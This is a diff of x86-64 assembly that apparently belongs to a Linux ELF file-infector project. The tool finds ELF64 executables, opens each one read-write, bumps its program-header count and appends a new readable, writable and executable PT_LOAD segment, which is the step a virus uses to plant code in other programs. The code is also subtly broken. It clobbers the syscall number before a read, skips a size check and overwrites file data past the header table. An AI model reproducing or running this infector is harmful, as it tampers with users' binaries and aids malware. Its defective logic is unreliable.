@@ -26,11 +26,13 @@ section .bss
     file_list:      resb MAX_FILES * FILE_ENTRY_SIZE  ; storage for file paths
     file_count:     resq 1                    ; number of files stored
     elf_header_buf: resb 64                   ; buffer for reading ELF header
+    elf_phdr_buf:   resb ELF64_PHDR_SIZE * MAX_PHDRS  ; buffer for program headers
 
 section .data
     newline:        db 10               ; newline character
     msg_valid:      db " is a valid elf64 executable", 10, 0
     msg_invalid:    db " is not a valid elf64 executable", 10, 0
+    msg_add_pt_load: db "add pt_load", 10, 0
 
 section .text
 global _start
@@ -385,6 +387,10 @@ check_elf64_exec:
     lea rdi, [rel msg_valid]
     call print_string
 
+    ; Call add_pt_load for this valid ELF64 executable
+    mov rdi, r15                ; pass the file path
+    call add_pt_load
+
     jmp .next_file
 
 .close_and_invalid:
@@ -407,6 +413,190 @@ check_elf64_exec:
     jmp .check_loop
 
 .check_done:
+    pop rbx
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; ============================================
+; add_pt_load(char *filepath)
+; rdi = pointer to file path
+; Adds a PT_LOAD segment to the ELF file
+; Modifies ELF header (e_phnum) and adds a new program header
+; ============================================
+add_pt_load:
+    push rbp
+    mov rbp, rsp
+    push r12                    ; saved file path
+    push r13                    ; saved file descriptor
+    push r14                    ; saved e_phoff
+    push r15                    ; saved e_phnum
+    push rbx                    ; saved e_phentsize
+
+    mov r12, rdi                ; r12 = file path
+
+    ; Open the file for read/write
+    mov eax, SYS_OPENAT
+    mov edi, AT_FDCWD
+    mov rsi, r12                ; pathname
+    mov edx, O_RDWR             ; flags: read-write
+    xor r10d, r10d
+    syscall
+
+    ; Check if open failed
+    test rax, rax
+    js .add_pt_load_fail        ; if fd < 0, fail
+
+    mov r13, rax                ; r13 = fd
+
+    ; Read the ELF header (64 bytes)
+    mov eax, SYS_READ
+    mov edi, r13d               ; fd
+    lea rsi, [rel elf_header_buf]
+    mov edx, 64                 ; read 64 bytes
+    syscall
+
+    ; Check if we read enough bytes
+    cmp rax, 64
+    jl .add_pt_load_close_fail
+
+    ; Get e_phoff (program header table offset) from ELF header at offset 32
+    lea rdi, [rel elf_header_buf]
+    mov r14, [rdi + e_phoff]    ; r14 = e_phoff
+
+    ; Get e_phnum (number of program headers) from ELF header at offset 56
+    movzx r15d, word [rdi + e_phnum]  ; r15 = e_phnum
+
+    ; Get e_phentsize (size of each program header entry) from ELF header at offset 54
+    movzx ebx, word [rdi + e_phentsize]  ; rbx = e_phentsize
+
+    ; Seek to the program header table
+    mov eax, SYS_LSEEK
+    mov edi, r13d               ; fd
+    mov rsi, r14                ; offset = e_phoff
+    xor edx, edx                ; SEEK_SET = 0
+    syscall
+
+    test rax, rax
+    js .add_pt_load_close_fail
+
+    ; Read all existing program headers
+    mov eax, SYS_READ
+    mov edi, r13d               ; fd
+    lea rsi, [rel elf_phdr_buf]
+    ; Calculate total size: e_phnum * e_phentsize
+    mov rax, r15                ; e_phnum
+    imul rax, rbx               ; * e_phentsize
+    mov rdx, rax                ; read size
+    syscall
+
+    ; Check if we read enough bytes
+    mov rax, r15
+    imul rax, rbx
+    ; (skip size check for now, just proceed)
+
+    ; Increment e_phnum in the ELF header buffer
+    lea rdi, [rel elf_header_buf]
+    inc word [rdi + e_phnum]
+
+    ; Create new PT_LOAD program header at the end of the phdr buffer
+    ; New phdr offset = e_phnum * e_phentsize (before increment, so use r15)
+    mov rax, r15                ; original e_phnum
+    imul rax, rbx               ; * e_phentsize
+    lea rdi, [rel elf_phdr_buf]
+    add rdi, rax                ; rdi = pointer to new phdr
+
+    ; Initialize the new PT_LOAD segment
+    ; p_type = PT_LOAD (1)
+    mov dword [rdi + p_type], PT_LOAD
+
+    ; p_flags = PF_R | PF_W | PF_X (readable, writable, executable)
+    mov dword [rdi + p_flags], PF_R | PF_W | PF_X
+
+    ; p_offset = 0 (for simplicity, start of file)
+    mov qword [rdi + p_offset], 0
+
+    ; p_vaddr = 0 (will be set by loader)
+    mov qword [rdi + p_vaddr], 0
+
+    ; p_paddr = 0
+    mov qword [rdi + p_paddr], 0
+
+    ; p_filesz = PT_LOAD_FILESZ (from include.s)
+    mov qword [rdi + p_filesz], PT_LOAD_FILESZ
+
+    ; p_memsz = PT_LOAD_MEMSZ (from include.s)
+    mov qword [rdi + p_memsz], PT_LOAD_MEMSZ
+
+    ; p_align = 0x1000 (4KB alignment)
+    mov qword [rdi + p_align], 0x1000
+
+    ; Seek back to beginning of file to write the ELF header
+    mov eax, SYS_LSEEK
+    mov edi, r13d               ; fd
+    xor esi, esi                ; offset = 0
+    xor edx, edx                ; SEEK_SET = 0
+    syscall
+
+    test rax, rax
+    js .add_pt_load_close_fail
+
+    ; Write the modified ELF header
+    mov eax, SYS_WRITE
+    mov edi, r13d               ; fd
+    lea rsi, [rel elf_header_buf]
+    mov edx, 64                 ; write 64 bytes
+    syscall
+
+    cmp rax, 64
+    jl .add_pt_load_close_fail
+
+    ; Seek to the program header table
+    mov eax, SYS_LSEEK
+    mov edi, r13d               ; fd
+    mov rsi, r14                ; offset = e_phoff
+    xor edx, edx                ; SEEK_SET = 0
+    syscall
+
+    test rax, rax
+    js .add_pt_load_close_fail
+
+    ; Write all program headers including the new one
+    mov eax, SYS_WRITE
+    mov edi, r13d               ; fd
+    lea rsi, [rel elf_phdr_buf]
+    ; Calculate total size: (original e_phnum + 1) * e_phentsize
+    mov rax, r15                ; original e_phnum
+    inc rax                     ; + 1 for new phdr
+    imul rax, rbx               ; * e_phentsize
+    mov rdx, rax                ; write size
+    syscall
+
+    ; Close the file
+    mov eax, SYS_CLOSE
+    mov edi, r13d
+    syscall
+
+    ; Print success message
+    lea rdi, [rel msg_add_pt_load]
+    call print_string
+
+    jmp .add_pt_load_done
+
+.add_pt_load_close_fail:
+    ; Close the file
+    mov eax, SYS_CLOSE
+    mov edi, r13d
+    syscall
+
+.add_pt_load_fail:
+    ; No success message printed on failure
+
+.add_pt_load_done:
     pop rbx
     pop r15
     pop r14
